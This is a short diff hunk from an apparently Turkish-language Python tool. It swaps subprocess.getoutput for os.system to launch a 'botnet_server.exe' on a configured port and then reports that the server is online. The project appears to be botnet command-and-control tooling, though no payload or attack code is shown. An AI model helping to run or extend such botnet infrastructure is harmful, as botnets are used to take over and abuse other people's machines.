@@ -355,7 +355,7 @@ else:
                 load = line.split(server+':')
                 break
     print(Fore.BLUE+'[i]'+Fore.RESET+' Sunucu: "'+server+'" Yükleniyor... [Port: '+load[1]+']')
-    subprocess.getoutput("start "+current_path+"/server/botnet_server.exe "+server+" "+load[1])
+    os.system("start "+current_path+"/server/botnet_server.exe "+server+" "+load[1])
     print(Fore.BLUE+'[i]'+Fore.RESET+' Sunucu: "'+server+f'" bağlantıları alıyor! ({Fore.LIGHTGREEN_EX}online{Fore.RESET})')
     port = load[1]
 
